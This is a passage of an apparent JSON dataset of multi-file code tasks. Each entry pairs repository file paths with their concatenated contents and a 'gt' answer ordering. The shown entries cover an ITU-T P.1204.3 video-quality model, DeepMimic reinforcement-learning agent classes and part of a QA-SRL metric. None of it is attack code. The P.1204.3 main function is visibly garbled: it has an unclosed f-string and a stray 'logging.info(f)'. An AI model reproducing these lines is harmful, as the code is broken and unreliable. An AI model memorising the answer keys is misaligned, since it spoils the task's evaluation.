   debug = {\n            col: float(per_sequence[\"debug\"][col].values[0])\n            for col in per_sequence[\"debug\"]\n        }\n        feature_values = {\n            col: float(per_sequence[\"features\"][col].values[0])\n            for col in per_sequence[\"features\"]\n        }\n\n        return {\n            \"video_full_path\": videofilename,\n            \"video_basename\": os.path.basename(videofilename),\n            \"per_second\": [float(x) for x in per_second],\n            \"per_sequence\": float(per_sequence[\"final_pred\"].values[0]),\n            \"debug\": debug,\n            \"features\": feature_values,\n            \"date\": str(datetime.datetime.now()),\n            \"version\": p1204_3.__version__\n        }\n\n'bitstream_mode3_p1204_3/p1204_3/__init__.py'\n:\n__version__ = \"0.1.3\"\nimport argparse\nimport itertools\nimport json\nimport logging\nimport multiprocessing\nimport traceback\n\nfrom p1204_3.generic import *\nfrom p1204_3.model import P1204BitstreamMode3\nfrom p1204_3.utils import *\n\n\ndef predict_quality(\n    videofilename,\n    model_config_filename=DEFAULT_MODEL,\n    device_type=\"pc\",\n    device_resolution=\"3840x2160\",\n    viewing_distance=\"1.5xH\",\n    display_size=55,\n    temporary_folder=\"tmp\",\n    cache_features=True,\n):\n    try:\n        return P1204BitstreamMode3().predict_quality(\n            videofilename,\n            model_config_filename,\n            device_type,\n            device_resolution,\n            viewing_distance,\n            display_size,\n            temporary_folder,\n            cache_features,\n        )\n    except Exception as e:\n        logging.error(\n            f\"there was a problem while processing {videofilename}  \"\n            + \"\\n\"\n            + \"error:\"\n            + str(e)\n        )\n        traceback.print_exc()\n        return {}\n\n\ndef main(_=[]):\n\n    parser = argparse.ArgumentParser(\n        description=\"ITU-T P.1204.3 video quality model reference implementation\",\n        epilog=\"stg7, rrao 2020\",\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter,\n    )\n    parser.add_argument(\n        \"video\", type=str, nargs=\"+\", help=\"input video to estimate quality\"\n    )\n    parser.add_argument(\n        \"--result_folder\",\n        type=str,\n        default=\"reports\",\n        help=\"folder to store video quality results\",\n    )\n    parser.add_argument(\n        \"--model\",\n        type=str,\n        default=DEFAULT_MODEL,\n        help=\"model config file to be used for prediction\",\n    )\n    parser.add_argument(\n        \"--cpu_count\",\n        type=int,\n        default=multiprocessing.cpu_count(),\n        help=\"thread/cpu count\",\n    )\n    parser.add_argument(\n        \"--device_type\",\n        choices=DEVICE_TYPES,\n        default=\"pc\",\n        help=\"device that is used for playout\",\n    )\n    parser.add_argument(\n        \"--device_resolution\",\n        choices=DEVICE_RESOLUTIONS,\n        default=\"3840x2160\",\n        help=\"resolution of the output device (width x height)\",\n    )\n    parser.add_argument(\n        \"--viewing_distance\",\n        choices=VIEWING_DISTANCES,\n        default=DEFAULT_VIEWING_DISTANCE,\n        help=\"viewing distance relative to the display height (not used for model prediction)\",\n    )\n    parser.add_argument(\n        \"--display_size\",\n        choices=DISPLAY_SIZES,\n        type=float,\n        default=DEFAULT_DISPLAY_SIZE,\n        help=\"display diagonal size in inches (not used for model prediction)\",\n    )\n    parser.add_argument(\n        \"--tmp\",\n        type=str,\n        default=\"./tmp\",\n        help=\"temporary folder to store bitstream stats and other intermediate results\",\n    )\n    parser.add_argument(\n        \"-d\",\n        \"--debug\",\n        action=\"store_true\",\n        help=\"show debug output\",\n    )\n    parser.add_argument(\n        \"-nocached_features\",\n        action=\"store_true\",\n        help=\"no caching of features\",\n    )\n    parser.add_argument(\n        \"-q\",\n        \"--quiet\",\n        action=\"store_true\",\n        help=\"not print any output except errors\",\n    )\n\n    a = vars(parser.parse_args())\n\n    if a[\"debug\"]:\n        logging.basicConfig(level=logging.DEBUG)\n        logging.debug(\"debug output enabled\")\n    elif a[\"quiet\"]:\n        logging.basicConfig(level=logging.ERROR)\n    else:\n        logging.basicConfig(level=logging.INFO)\n\n    assert_file(a[\"model\"], \"model folder is not valid\")\n    logging.info(\n        f\"handle the following videos (\n        + \"\\n  \".join(a[\"video\"])\n    )\n\n    if a[\"viewing_distance\"] != DEFAULT_VIEWING_DISTANCE:\n        logging.warn(\n            \"Changing the viewing distance is not supported in the official ITU-T Rec. P.1204.3 model \"\n            \"and has no effect. The option is only there for possible future implemetations.\"\n        )\n\n    if a[\"display_size\"] != DEFAULT_DISPLAY_SIZE:\n        logging.warn(\n            \"Changing the display size is not supported in the official ITU-T Rec. P.1204.3 model \"\n            \"and has no effect. The option is only there for possible future implemetations.\"\n        )\n\n    params = [\n        (\n            video,\n            a[\"model\"],\n            a[\"device_type\"],\n            a[\"device_resolution\"],\n            a[\"viewing_distance\"],\n            a[\"display_size\"],\n            a[\"tmp\"],\n            not a[\"nocached_features\"],\n        )\n        for video in a[\"video\"]\n    ]\n    if a[\"cpu_count\"] > 1:\n        pool = multiprocessing.Pool(a[\"cpu_count\"])\n        results = pool.starmap(predict_quality, params)\n    else:\n        results = list(itertools.starmap(predict_quality, params))\n\n    print(json.dumps(results, indent=4, sort_keys=True))\n    logging.info(f\"\"\"store all results to {a[\"result_folder\"]}\"\"\")\n    os.makedirs(a[\"result_folder\"], exist_ok=True)\n    for result in results:\n        if result == {} or \"video_basename\" not in result:\n\n            continue\n        reportname = os.path.join(\n            a[\"result_folder\"], os.path.splitext(result[\"video_basename\"])[0] + \".json\"\n        )\n        json_store(reportname, result)\n        logging.info(f)\n\n\nif __name__ == \"__main__\":\n    sys.exit(main(sys.argv[1:]))\n",
        "gt": [
            "'bitstream_mode3_p1204_3/p1204_3/generic.py'",
            "'bitstream_mode3_p1204_3/p1204_3/__init__.py'",
            "'bitstream_mode3_p1204_3/p1204_3/model.py'"
        ]
    },
    {
        "files": [
            "'DeepMimic_mujoco/src/dp_policy_testing/GetAction.py'",
            "'DeepMimic_mujoco/src/dp_policy_testing/learning/rl_agent.py'",
            "'DeepMimic_mujoco/src/dp_policy_testing/learning/exp_params.py'",
            "'DeepMimic_mujoco/src/dp_policy_testing/learning/rl_world.py'"
        ],
        "content": "'DeepMimic_mujoco/src/dp_policy_testing/GetAction.py'\n:import numpy as np\nimport sys\nimport random\n\nfrom learning.rl_world import RLWorld\nfrom util.arg_parser import ArgParser\nfrom util.logger import Logger\nimport util.mpi_util as MPIUtil\nimport util.util as Util\n\ndef build_arg_parser(args):\n    arg_parser = ArgParser()\n    arg_parser.load_args(args)\n\n    arg_file = arg_parser.parse_string('arg_file', '')\n    if (arg_file != ''):\n        succ = arg_parser.load_file(arg_file)\n        assert succ, Logger.print('Failed to load args from: ' + arg_file)\n\n    rand_seed_key = 'rand_seed'\n    if (arg_parser.has_key(rand_seed_key)):\n        rand_seed = arg_parser.parse_int(rand_seed_key)\n        rand_seed += 1000 * MPIUtil.get_proc_rank()\n        Util.set_global_seeds(rand_seed)\n\n    return arg_parser\n\nclass ActionGiver():\n    def __init__(self, args):\n        arg_parser = build_arg_parser(args)\n        self.world = RLWorld(arg_parser)\n\n    def get_ac(self, s, g):\n        return self.world.get_action(s, g)\n\nif __name__ == '__main__':\n\n    args = ['--arg_file', 'args/run_humanoid3d_walk_args.txt']\n    action_giver = ActionGiver(args)\n    state = np.zeros(197)\n    goal = np.zeros(1)\n    action = action_giver.get_ac(state, goal)\n    print(action)\n    print('Shape:', action.shape)\n'DeepMimic_mujoco/src/dp_policy_testing/learning/rl_agent.py'\n:import numpy as np\nimport copy\nimport os\nimport time\n\nfrom abc import ABC, abstractmethod\nfrom enum import Enum\n\nfrom learning.path import *\nfrom learning.exp_params import ExpParams\nfrom learning.normalizer import Normalizer\nfrom learning.replay_buffer import ReplayBuffer\nfrom util.logger import Logger\nimport util.mpi_util as MPIUtil\nimport util.math_util as MathUtil\n\nclass RLAgent(ABC):\n    class Mode(Enum):\n        TRAIN = 0\n        TEST = 1\n        TRAIN_END = 2\n\n    NAME = \"None\"\n\n    UPDATE_PERIOD_KEY = \"UpdatePeriod\"\n    ITERS_PER_UPDATE = \"ItersPerUpdate\"\n    DISCOUNT_KEY = \"Discount\"\n    MINI_BATCH_SIZE_KEY = \"MiniBatchSize\"\n    REPLAY_BUFFER_SIZE_KEY = \"ReplayBufferSize\"\n    INIT_SAMPLES_KEY = \"InitSamples\"\n    NORMALIZER_SAMPLES_KEY = \"NormalizerSamples\"\n\n    OUTPUT_ITERS_KEY = \"OutputIters\"\n    INT_OUTPUT_ITERS_KEY = \"IntOutputIters\"\n    TEST_EPISODES_KEY = \"TestEpisodes\"\n\n    EXP_ANNEAL_SAMPLES_KEY = \"ExpAnnealSamples\"\n    EXP_PARAM_BEG_KEY = \"ExpParamsBeg\"\n    EXP_PARAM_END_KEY = \"ExpParamsEnd\"\n\n\n    def __init__(self, world, id, json_data):\n        self.world = world\n        self.id = id\n        self.logger = Logger()\n        self._mode = self.Mode.TRAIN\n\n        assert self._check_action_space(), \\\n            Logger.print(\"Invalid action space, got {:s}\".format(str(self.get_action_space())))\n\n        self._enable_training = True\n        self.path = Path()\n        self.iter = int(0)\n        self.start_time = time.time()\n        self._update_counter = 0\n\n        self.update_period = 1.0\n        self.iters_per_update = int(1)\n        self.discount = 0.95\n        self.mini_batch_size = int(32)\n        self.replay_buffer_size = int(50000)\n        self.init_samples = int(1000)\n        self.normalizer_samples = np.inf\n        self._local_mini_batch_size = self.mini_batch_size\n        self._need_normalizer_update = True\n        self._total_sample_count = 0\n\n        self._output_dir = \"\"\n        self._int_output_dir = \"\"\n        self.output_iters = 100\n        self.int_output_iters = 100\n\n        self.train_return = 0.0\n        self.test_episodes = int(0)\n        self.test_episode_count = int(0)\n        self.test_return = 0.0\n        self.avg_test_return = 0.0\n\n        self.exp_anneal_samples = 320000\n        self.exp_params_beg = ExpParams()\n        self.exp_params_end = ExpParams()\n        self.exp_params_curr = ExpParams()\n\n        self._load_params(json_data)\n        self._build_replay_buffer(self.replay_buffer_size)\n        self._build_normalizers()\n        self._build_bounds()\n        self.reset()\n\n        return\n\n    def __str__(self):\n        action_space_str = str(self.get_action_space())\n        info_str = \"\"\n        info_str += '\"ID\": {:d},\\n \"Type\": \"{:s}\",\\n \"ActionSpace\": \"{:s}\",\\n \"StateDim\": {:d},\\n \"GoalDim\": {:d},\\n \"ActionDim\": {:d}'.format(\n            self.id, self.NAME, action_space_str[action_space_str.rfind('.') + 1:], self.get_state_size(), self.get_goal_size(), self.get_action_size())\n        return \"{\\n\" + info_str + \"\\n}\"\n\n    def get_output_dir(self):\n        return self._output_dir\n\n    def set_output_dir(self, out_dir):\n        self._output_dir = out_dir\n        if (self._output_dir != \"\"):\n            self.logger.configure_output_file(out_dir + \"/agent\" + str(self.id) + \"_log.txt\")\n        return\n\n    output_dir = property(get_output_dir, set_output_dir)\n\n    def get_int_output_dir(self):\n        return self._int_output_dir\n\n    def set_int_output_dir(self, out_dir):\n        self._int_output_dir = out_dir\n        return\n\n    int_output_dir = property(get_int_output_dir, set_int_output_dir)\n\n    def reset(self):\n        self.path.clear()\n        return\n\n    def update(self, timestep):\n        if self.need_new_action():\n            self._update_new_action()\n\n        if (self._mode == self.Mode.TRAIN and self.enable_training):\n            self._update_counter += timestep\n\n            while self._update_counter >= self.update_period:\n                self._train()\n                self._update_exp_params()\n                self.world.env.set_sample_count(self._total_sample_count)\n                self._update_counter -= self.update_period\n\n        return\n\n    def end_episode(self):\n        if (self.path.pathlength() > 0):\n            self._end_path()\n\n            if (self._mode == self.Mode.TRAIN or self._mode == self.Mode.TRAIN_END):\n                if (self.enable_training and self.path.pathlength() > 0):\n                    self._store_path(self.path)\n            elif (self._mode == self.Mode.TEST):\n                self._update_test_return(self.path)\n            else:\n                assert False, Logger.print(\"Unsupported RL agent mode\" + str(self._mode))\n\n            self._update_mode()\n        return\n\n    def has_goal(self):\n        return self.get_goal_size() > 0\n\n    def predict_val(self):\n        return 0\n\n    def get_enable_training(self):\n        return self._enable_training\n\n    def set_enable_training(self, enable):\n        self._enable_training = enable\n        if (self._enable_training):\n            self.reset()\n        return\n\n    enable_training = property(get_enable_training, set_enable_training)\n\n    def enable_testing(self):\n        return self.test_episodes > 0\n\n    def get_name(self):\n        return self.NAME\n\n    @abstractmethod\n    def save_model(self, out_path):\n        pass\n\n    @abstractmethod\n    def load_model(self, in_path):\n        pass\n\n    @abstractmethod\n    def _decide_action(self, s, g):\n        pass\n\n    @abstractmethod\n    def _get_output_path(self):\n        pass\n\n    @abstractmethod\n    def _get_int_output_path(self):\n        pass\n\n    @abstractmethod\n    def _train_step(self):\n        pass\n\n    @abstractmethod\n    def _check_action_space(self):\n        pass\n\n    def get_action_space(self):\n        return 1\n\n    def get_state_size(self):\n        return 197\n\n    def get_goal_size(self):\n        return 0\n\n    def get_action_size(self):\n        return 36\n\n    def get_num_actions(self):\n        return self.world.env.get_num_actions(self.id)\n\n    def need_new_action(self):\n        return self.world.env.need_new_action(self.id)\n\n    def _build_normalizers(self):\n        self.s_norm = Normalizer(self.get_state_size(), self.world.env.build_state_norm_groups(self.id))\n        self.s_norm.set_mean_std(-self.world.env.build_state_offset(self.id),\n                                 1 / self.world.env.build_state_scale(self.id))\n\n        self.g_norm = Normalizer(self.get_goal_size(), self.world.env.build_goal_norm_groups(self.id))\n        self.g_norm.set_mean_std(-self.world.env.build_goal_offset(self.id),\n                                 1 / self.world.env.build_goal_scale(self.id))\n\n        self.a_norm = Normalizer(self.world.env.get_action_size())\n        self.a_norm.set_mean_std(-self.world.env.build_action_offset(self.id),\n                                 1 / self.world.env.build_action_scale(self.id))\n        return\n\n    def _build_bounds(self):\n        self.a_bound_min = -10 * np.ones(self.get_action_size())\n        self.a_bound_max =  10 * np.ones(self.get_action_size())\n        return\n\n    def _load_params(self, json_data):\n        if (self.UPDATE_PERIOD_KEY in json_data):\n            self.update_period = int(json_data[self.UPDATE_PERIOD_KEY])\n\n        if (self.ITERS_PER_UPDATE in json_data):\n            self.iters_per_update = int(json_data[self.ITERS_PER_UPDATE])\n\n        if (self.DISCOUNT_KEY in json_data):\n            self.discount = json_data[self.DISCOUNT_KEY]\n\n        if (self.MINI_BATCH_SIZE_KEY in json_data):\n            self.mini_batch_size = int(json_data[self.MINI_BATCH_SIZE_KEY])\n\n        if (self.REPLAY_BUFFER_SIZE_KEY in json_data):\n            self.replay_buffer_size = int(json_data[self.REPLAY_BUFFER_SIZE_KEY])\n\n        if (self.INIT_SAMPLES_KEY in json_data):\n            self.init_samples = int(json_data[self.INIT_SAMPLES_KEY])\n\n        if (self.NORMALIZER_SAMPLES_KEY in json_data):\n            self.normalizer_samples = int(json_data[self.NORMALIZER_SAMPLES_KEY])\n\n        if (self.OUTPUT_ITERS_KEY in json_data):\n            self.output_iters = json_data[self.OUTPUT_ITERS_KEY]\n\n        if (self.INT_OUTPUT_ITERS_KEY in json_data):\n            self.int_output_iters = json_data[self.INT_OUTPUT_ITERS_KEY]\n\n        if (self.TEST_EPISODES_KEY in json_data):\n            self.test_episodes = int(json_data[self.TEST_EPISODES_KEY])\n\n        if (self.EXP_ANNEAL_SAMPLES_KEY in json_data):\n            self.exp_anneal_samples = json_data[self.EXP_ANNEAL_SAMPLES_KEY]\n\n        if (self.EXP_PARAM_BEG_KEY in json_data):\n            self.exp_params_beg.load(json_data[self.EXP_PARAM_BEG_KEY])\n\n        if (self.EXP_PARAM_END_KEY in json_data):\n            self.exp_params_end.load(json_data[self.EXP_PARAM_END_KEY])\n\n        num_procs = MPIUtil.get_num_procs()\n        self._local_mini_batch_size = int(np.ceil(self.mini_batch_size / num_procs))\n        self._local_mini_batch_size = np.maximum(self._local_mini_batch_size, 1)\n        self.mini_batch_size = self._local_mini_batch_size * num_procs\n\n        assert(self.exp_params_beg.noise == self.exp_params_end.noise)\n        self.exp_params_curr = copy.deepcopy(self.exp_params_beg)\n        self.exp_params_end.noise = self.exp_params_beg.noise\n\n        self._need_normalizer_update = self.normalizer_samples > 0\n\n        return\n\n    def _record_state(self):\n        s = self.world.env.record_state(self.id)\n        return s\n\n    def _record_goal(self):\n        g = self.world.env.record_goal(self.id)\n        return g\n\n    def _record_reward(self):\n        r = self.world.env.calc_reward(self.id)\n        return r\n\n    def _apply_action(self, a):\n        self.world.env.set_action(self.id, a)\n        return\n\n    def _record_flags(self):\n        return int(0)\n\n    def _is_first_step(self):\n        return len(self.path.states) == 0\n\n    def _end_path(self):\n        s = self._record_state()\n        g = self._record_goal()\n        r = self._record_reward()\n\n        self.path.rewards.append(r)\n        self.path.states.append(s)\n        self.path.goals.append(g)\n        self.path.terminate = self.world.env.check_terminate(self.id)\n\n        return\n\n    def get_action(self, s, g):\n        action, _ = self._decide_action(s=s, g=g)\n        return action\n\n    def _update_new_action(self):\n        s = self._record_state()\n        g = self._record_goal()\n\n        if not (self._is_first_step()):\n            r = self._record_reward()\n            self.path.rewards.append(r)\n\n        a, logp = self._decide_action(s=s, g=g)\n        assert len(np.shape(a)) == 1\n        assert len(np.shape(logp)) <= 1\n\n        flags = self._record_flags()\n        self._apply_action(a)\n\n        self.path.states.append(s)\n        self.path.goals.append(g)\n        self.path.actions.append(a)\n        self.path.logps.append(logp)\n        self.path.flags.append(flags)\n\n        if self._enable_draw():\n            self._log_val(s, g)\n\n        return\n\n    def _update_exp_params(self):\n        lerp = float(self._total_sample_count) / self.exp_anneal_samples\n        lerp = np.clip(lerp, 0.0, 1.0)\n        self.exp_params_curr = self.exp_params_beg.lerp(self.exp_params_end, lerp)\n        return\n\n    def _update_test_return(self, path):\n        path_reward = path.calc_return()\n        self.test_return += path_reward\n        self.test_episode_count += 1\n        return\n\n    def _update_mode(self):\n        if (self._mode == self.Mode.TRAIN):\n            self._update_mode_train()\n        elif (self._mode == self.Mode.TRAIN_END):\n            self._update_mode_train_end()\n        elif (self._mode == self.Mode.TEST):\n            self._update_mode_test()\n        else:\n            assert False, Logger.print(\"Unsupported RL agent mode\" + str(self._mode))\n        return\n\n    def _update_mode_train(self):\n        return\n\n    def _update_mode_train_end(self):\n        self._init_mode_test()\n        return\n\n    def _update_mode_test(self):\n        if (self.test_episode_count * MPIUtil.get_num_procs() >= self.test_episodes):\n            global_return = MPIUtil.reduce_sum(self.test_return)\n            global_count = MPIUtil.reduce_sum(self.test_episode_count)\n            avg_return = global_return / global_count\n            self.avg_test_return = avg_return\n\n            if self.enable_training:\n                self._init_mode_train()\n        return\n\n    def _init_mode_train(self):\n        self._mode = self.Mode.TRAIN\n        self.world.env.set_mode(self._mode)\n        return\n\n    def _init_mode_train_end(self):\n        self._mode = self.Mode.TRAIN_END\n        return\n\n    def _init_mode_test(self):\n        self._mode = self.Mode.TEST\n        self.test_return = 0.0\n        self.test_episode_count = 0\n        self.world.env.set_mode(self._mode)\n        return\n\n    def _enable_output(self):\n        return MPIUtil.is_root_proc() and self.output_dir != \"\"\n\n    def _enable_int_output(self):\n        return MPIUtil.is_root_proc() and self.int_output_dir != \"\"\n\n    def _calc_val_bounds(self, discount):\n        r_min = 0\n        r_max = 1\n        assert(r_min <= r_max)\n\n        val_min = r_min / ( 1.0 - discount)\n        val_max = r_max / ( 1.0 - discount)\n        return val_min, val_max\n\n    def _calc_val_offset_scale(self, discount):\n        val_min, val_max = self._calc_val_bounds(discount)\n        val_offset = 0\n        val_scale = 1\n\n        if (np.isfinite(val_min) and np.isfinite(val_max)):\n            val_offset = -0.5 * (val_max + val_min)\n            val_scale = 2 / (val_max - val_min)\n\n        return val_offset, val_scale\n\n    def _calc_term_vals(self, discount):\n        r_fail = 0\n        r_succ = 1\n\n        r_min = 0\n        r_max = 1\n        assert(r_fail <= r_max and r_fail >= r_min)\n        assert(r_succ <= r_max and r_succ >= r_min)\n        assert(not np.isinf(r_fail))\n        assert(not np.isinf(r_succ))\n\n        if (discount == 0):\n            val_fail = 0\n            val_succ = 0\n        else:\n            val_fail = r_fail / (1.0 - discount)\n            val_succ = r_succ / (1.0 - discount)\n\n        return val_fail, val_succ\n\n    def _update_iter(self, iter):\n        if (self._enable_output() and self.iter % self.output_iters == 0):\n            output_path = self._get_output_path()\n            output_dir = os.path.dirname(output_path)\n            if not os.path.exists(output_dir):\n                os.makedirs(output_dir)\n            self.save_model(output_path)\n\n        if (self._enable_int_output() and self.iter % self.int_output_iters == 0):\n            int_output_path = self._get_int_output_path()\n            int_output_dir = os.path.dirname(int_output_path)\n            if not os.path.exists(int_output_dir):\n                os.makedirs(int_output_dir)\n            self.save_model(int_output_path)\n\n        self.iter = iter\n        return\n\n    def _enable_draw(self):\n        return self.world.env.enable_draw\n\n    def _log_val(self, s, g):\n        pass\n\n    def _build_replay_buffer(self, buffer_size):\n        num_procs = MPIUtil.get_num_procs()\n        buffer_size = int(buffer_size / num_procs)\n        self.replay_buffer = ReplayBuffer(buffer_size=buffer_size)\n        self.replay_buffer_initialized = False\n        return\n\n    def _store_path(self, path):\n        path_id = self.replay_buffer.store(path)\n        valid_path = path_id != MathUtil.INVALID_IDX\n\n        if valid_path:\n            self.train_return = path.calc_return()\n\n            if self._need_normalizer_update:\n                self._record_normalizers(path)\n\n        return path_id\n\n    def _record_normalizers(self, path):\n        states = np.array(path.states)\n        self.s_norm.record(states)\n\n        if self.has_goal():\n            goals = np.array(path.goals)\n            self.g_norm.record(goals)\n\n        return\n\n    def _update_normalizers(self):\n        self.s_norm.update()\n\n        if self.has_goal():\n            self.g_norm.update()\n        return\n\n    def _train(self):\n        samples = self.replay_buffer.total_count\n        self._total_sample_count = int(MPIUtil.reduce_sum(samples))\n        end_training = False\n\n        if (self.replay_buffer_initialized):\n            if (self._valid_train_step()):\n                prev_iter = self.iter\n                iters = self._get_iters_per_update()\n                avg_train_return = MPIUtil.reduce_avg(self.train_return)\n\n                for i in range(iters):\n                    curr_iter = self.iter\n                    wall_time = time.time() - self.start_time\n                    wall_time /= 60 * 60\n\n                    has_goal = self.has_goal()\n                    s_mean = np.mean(self.s_norm.mean)\n                    s_std = np.mean(self.s_norm.std)\n                    g_mean = np.mean(self.g_norm.mean) if has_goal else 0\n                    g_std = np.mean(self.g_norm.std) if has_goal else 0\n\n                    self.logger.log_tabular(\"Iteration\", self.iter)\n                    self.logger.log_tabular(\"Wall_Time\", wall_time)\n                    self.logger.log_tabular(\"Samples\", self._total_sample_count)\n                    self.logger.log_tabular(\"Train_Return\", avg_train_return)\n                    self.logger.log_tabular(\"Test_Return\", self.avg_test_return)\n                    self.logger.log_tabular(\"State_Mean\", s_mean)\n                    self.logger.log_tabular(\"State_Std\", s_std)\n                    self.logger.log_tabular(\"Goal_Mean\", g_mean)\n                    self.logger.log_tabular(\"Goal_Std\", g_std)\n                    self._log_exp_params()\n\n                    self._update_iter(self.iter + 1)\n                    self._train_step()\n\n                    Logger.print(\"Agent \" + str(self.id))\n                    self.logger.print_tabular()\n                    Logger.print(\"\")\n\n                    if (self._enable_output() and curr_iter % self.int_output_iters == 0):\n                        self.logger.dump_tabular()\n\n                if (prev_iter // self.int_output_iters != self.iter // self.int_output_iters):\n                    end_training = self.enable_testing()\n\n        else:\n\n            Logger.print(\"Agent \" + str(self.id))\n            Logger.print(\"Samples: \" + str(self._total_sample_count))\n            Logger.print(\"\")\n\n            if (self._total_sample_count >= self.init_samples):\n                self.replay_buffer_initialized = True\n                end_training = self.enable_testing()\n\n        if self._need_normalizer_update:\n            self._update_normalizers()\n            self._need_normalizer_update = self.normalizer_samples > self._total_sample_count\n\n        if end_training:\n            self._init_mode_train_end()\n\n        return\n\n    def _get_iters_per_update(self):\n        return MPIUtil.get_num_procs() * self.iters_per_update\n\n    def _valid_train_step(self):\n        return True\n\n    def _log_exp_params(self):\n        self.logger.log_tabular(\"Exp_Rate\", self.exp_params_curr.rate)\n        self.logger.log_tabular(\"Exp_Noise\", self.exp_params_curr.noise)\n        self.logger.log_tabular(\"Exp_Temp\", self.exp_params_curr.temp)\n        return\n'DeepMimic_mujoco/src/dp_policy_testing/learning/exp_params.py'\n:import json\nimport numpy as np\nimport util.math_util as MathUtil\n\nclass ExpParams(object):\n    RATE_KEY = 'Rate'\n    INIT_ACTION_RATE_KEY = 'InitActionRate'\n    NOISE_KEY = 'Noise'\n    NOISE_INTERNAL_KEY = 'NoiseInternal'\n    TEMP_KEY = 'Temp'\n\n    def __init__(self):\n        self.rate = 0.2\n        self.init_action_rate = 0\n        self.noise = 0.1\n        self.noise_internal = 0\n        self.temp = 0.1\n        return\n\n    def __str__(self):\n        str = ''\n        str += '{}: {:.2f}\\n'.format(self.RATE_KEY, self.rate)\n        str += '{}: {:.2f}\\n'.format(self.INIT_ACTION_RATE_KEY, self.init_action_rate)\n        str += '{}: {:.2f}\\n'.format(self.NOISE_KEY, self.noise)\n        str += '{}: {:.2f}\\n'.format(self.NOISE_INTERNAL_KEY, self.noise_internal)\n        str += '{}: {:.2f}\\n'.format(self.TEMP_KEY, self.temp)\n        return str\n\n    def load(self, json_data):\n        if (self.RATE_KEY in json_data):\n            self.rate = json_data[self.RATE_KEY]\n\n        if (self.INIT_ACTION_RATE_KEY in json_data):\n            self.init_action_rate = json_data[self.INIT_ACTION_RATE_KEY]\n\n        if (self.NOISE_KEY in json_data):\n            self.noise = json_data[self.NOISE_KEY]\n\n        if (self.NOISE_INTERNAL_KEY in json_data):\n            self.noise_internal = json_data[self.NOISE_INTERNAL_KEY]\n\n        if (self.TEMP_KEY in json_data):\n            self.temp = json_data[self.TEMP_KEY]\n\n        return\n\n    def lerp(self, other, t):\n        lerp_params = ExpParams()\n        lerp_params.rate = MathUtil.lerp(self.rate, other.rate, t)\n        lerp_params.init_action_rate = MathUtil.lerp(self.init_action_rate, other.init_action_rate, t)\n        lerp_params.noise = MathUtil.lerp(self.noise, other.noise, t)\n        lerp_params.noise_internal = MathUtil.lerp(self.noise_internal, other.noise_internal, t)\n        lerp_params.temp = MathUtil.log_lerp(self.temp, other.temp, t)\n        return lerp_params\n'DeepMimic_mujoco/src/dp_policy_testing/learning/rl_world.py'\n:import numpy as np\nimport learning.agent_builder as AgentBuilder\nimport learning.tf_util as TFUtil\nfrom learning.rl_agent import RLAgent\nfrom util.logger import Logger\n\nclass RLWorld(object):\n    def __init__(self, arg_parser):\n        TFUtil.disable_gpu()\n\n        self.arg_parser = arg_parser\n        self._enable_training = True\n        self.train_agents = []\n        self.parse_args(arg_parser)\n\n        self.build_agents()\n\n        return\n\n    def parse_args(self, arg_parser):\n        self.train_agents = self.arg_parser.parse_bools('train_agents')\n        num_agents = 1\n        assert(len(self.train_agents) == num_agents or len(self.train_agents) == 0)\n\n        return\n\n    def build_agents(self):\n        num_agents = 1\n        self.agents = []\n\n        Logger.print('')\n        Logger.print('Num Agents: {:d}'.format(num_agents))\n\n        agent_files = self.arg_parser.parse_strings('agent_files')\n        assert(len(agent_files) == num_agents or len(agent_files) == 0)\n\n        model_files = self.arg_parser.parse_strings('model_files')\n        assert(len(model_files) == num_agents or len(model_files) == 0)\n\n        output_path = self.arg_parser.parse_string('output_path')\n        int_output_path = self.arg_parser.parse_string('int_output_path')\n\n        for i in range(num_agents):\n            curr_file = agent_files[i]\n            curr_agent = self._build_agent(i, curr_file)\n\n            if curr_agent is not None:\n                curr_agent.output_dir = output_path\n                curr_agent.int_output_dir = int_output_path\n                Logger.print(str(curr_agent))\n\n                if (len(model_files) > 0):\n                    curr_model_file = model_files[i]\n                    if curr_model_file != 'none':\n                        curr_agent.load_model(curr_model_file)\n\n            self.agents.append(curr_agent)\n            Logger.print('')\n        return\n\n    def get_action(self, s, g):\n        return self.agents[0].get_action(s, g)\n\n    def _build_agent(self, id, agent_file):\n        Logger.print('Agent {:d}: {}'.format(id, agent_file))\n        if (agent_file == 'none'):\n            agent = None\n        else:\n            agent = AgentBuilder.build_agent(self, id, agent_file)\n            assert (agent != None), 'Failed to build agent {:d} from: {}'.format(id, agent_file)\n\n        return agent\n",
        "gt": [
            "'DeepMimic_mujoco/src/dp_policy_testing/learning/exp_params.py'",
            "'DeepMimic_mujoco/src/dp_policy_testing/learning/rl_agent.py'",
            "'DeepMimic_mujoco/src/dp_policy_testing/learning/rl_world.py'",
            "'DeepMimic_mujoco/src/dp_policy_testing/GetAction.py'"
        ]
    },
    {
        "files": [
            "'nrl-qasrl/nrl/__init__.py'",
            "'nrl-qasrl/nrl/metrics/question_prediction_metric.py'",
            "'nrl-qasrl/nrl/models/__init__.py'",
            "'nrl-qasrl/nrl/models/question_predictor.py'",
            "'nrl-qasrl/nrl/models/qasrl_parser.py'"
        ],
        "content": "'nrl-qasrl/nrl/__init__.py'\n:import nrl.data.dataset_readers\nimport nrl.models\nimport nrl.service\nimport nrl.service.predictors\n\n'nrl-qasrl/nrl/metrics/question_prediction_metric.py'\n:from typing import Dict, List, Optional, Set, Tuple\n\nimport torch\n\nfrom allennlp.nn.util import get_lengths_from_binary_sequence_mask\nfrom allennlp.data.vocabulary import Vocabulary\nfrom allennlp.training.metrics.metric import Metric\n\nclass QuestionPredictionMetric(Metric):\n    def __init__(self,\n            vocabulary: Vocabulary,\n            slot_labels: List[str],\n            count_span : bool = False,\n            fine_grained: bool = False):\n        self._vocabulary = vocabulary\n        self._bio_vocabulary = vocabulary.get_index_to_token_vocabulary(\"bio_labels\")\n        self._slot_labels = slot_labels\n        self._count_span = count_span\n        self._fine_grained = fine_grained\n\n        self.reset()\n\n    def reset(self):\n        self._total_words = 0.\n        self._total_questions = 0.\n        self._correct = [0.] * len(self._slot_labels)\n        self._partial_correct = 0.\n        self._completely_correct = 0.\n        self._completely_correct_with_span = 0.\n        self._wh_correct = {}\n        self._wh_total = {}\n\n\n    def __call__(self,\n            slot_logits: List[torch.Tensor],\n            slot_labels: List[torch.Tensor],\n            spans: torch.Tensor,\n            bio_logit: torch.Tensor = None,\n            mask: Optional[torch.Tensor] = None,\n            sequence_mask: Optional[torch.Tensor] = None):\n        if mask is None:\n            mask = torch.ones_like(slot_labels)\n\n        gold = []\n        pred = []\n        has_span = []\n\n        mask, sequence_mask, spans = self.unwrap_to_tensors(mask, sequence_mask, spans)\n        if bio_logit is not None:\n            